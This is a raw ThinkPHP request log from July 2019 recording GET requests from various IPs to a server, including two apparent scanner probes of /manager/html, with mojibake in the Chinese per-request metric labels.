[è¿è¡Œæ—¶é—´ï¼š0.001573s] [åžåçŽ‡ï¼š635.79req/s] [å†…å­˜æ¶ˆè€—ï¼š153.48kb] [æ–‡ä»¶åŠ è½½ï¼š40]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '129.28.123.113',
  'user-agent' => 'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T15:49:40+08:00 ] 54.254.234.112 GET 129.28.123.113:80/manager/html
[è¿è¡Œæ—¶é—´ï¼š0.001860s] [åžåçŽ‡ï¼š537.66req/s] [å†…å­˜æ¶ˆè€—ï¼š153.32kb] [æ–‡ä»¶åŠ è½½ï¼š40]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => 'Basic Og==',
  'host' => '129.28.123.113:80',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
  'accept' => 'text/html, application/xhtml+xml, */*',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T16:44:06+08:00 ] 77.93.47.249 GET /
[è¿è¡Œæ—¶é—´ï¼š0.002400s] [åžåçŽ‡ï¼š416.68req/s] [å†…å­˜æ¶ˆè€—ï¼š273.41kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T20:19:56+08:00 ] 46.225.248.13 GET 129.28.123.113:80/
[è¿è¡Œæ—¶é—´ï¼š0.002297s] [åžåçŽ‡ï¼š435.36req/s] [å†…å­˜æ¶ˆè€—ï¼š274.30kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '129.28.123.113:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T22:13:18+08:00 ] 94.183.117.16 GET 129.28.123.113/
[è¿è¡Œæ—¶é—´ï¼š0.001743s] [åžåçŽ‡ï¼š573.78req/s] [å†…å­˜æ¶ˆè€—ï¼š274.70kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'cache-control' => 'max-age=0',
  'host' => '129.28.123.113',
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T22:19:12+08:00 ] 95.170.114.61 GET 129.28.123.113:80/
[è¿è¡Œæ—¶é—´ï¼š0.001826s] [åžåçŽ‡ï¼š547.63req/s] [å†…å­˜æ¶ˆè€—ï¼š274.30kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '129.28.123.113:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T22:33:03+08:00 ] 5.8.10.202 GET 129.28.123.113/
[è¿è¡Œæ—¶é—´ï¼š0.001970s] [åžåçŽ‡ï¼š507.60req/s] [å†…å­˜æ¶ˆè€—ï¼š274.52kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Windows NT 5.0) AppleWebKit/5321 (KHTML, like Gecko) Chrome/13.0.847.0 Safari/5321',
  'host' => '129.28.123.113',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T22:33:12+08:00 ] 5.8.10.202 GET 129.28.123.113/index.php
[è¿è¡Œæ—¶é—´ï¼š0.001725s] [åžåçŽ‡ï¼š579.72req/s] [å†…å­˜æ¶ˆè€—ï¼š274.40kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 Mozilla/5.0 (Windows NT 5.0; rv:15.0) Gecko/20150523 Firefox/15.0',
  'host' => '129.28.123.113',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T22:49:29+08:00 ] 93.174.93.114 GET 129.28.123.113/
[è¿è¡Œæ—¶é—´ï¼š0.002097s] [åžåçŽ‡ï¼š476.90req/s] [å†…å­˜æ¶ˆè€—ï¼š274.37kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/3.0)',
  'host' => '129.28.123.113',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T22:49:40+08:00 ] 93.174.93.114 GET 129.28.123.113/index.php
[è¿è¡Œæ—¶é—´ï¼š0.001909s] [åžåçŽ‡ï¼š523.83req/s] [å†…å­˜æ¶ˆè€—ï¼š274.54kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Windows NT 5.0) AppleWebKit/5350 (KHTML, like Gecko) Chrome/31.0.820.0 Safari/5350',
  'host' => '129.28.123.113',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T23:58:16+08:00 ] 103.69.45.227 GET 129.28.123.113:80/
[è¿è¡Œæ—¶é—´ï¼š0.001560s] [åžåçŽ‡ï¼š641.04req/s] [å†…å­˜æ¶ˆè€—ï¼š274.30kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '129.28.123.113:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
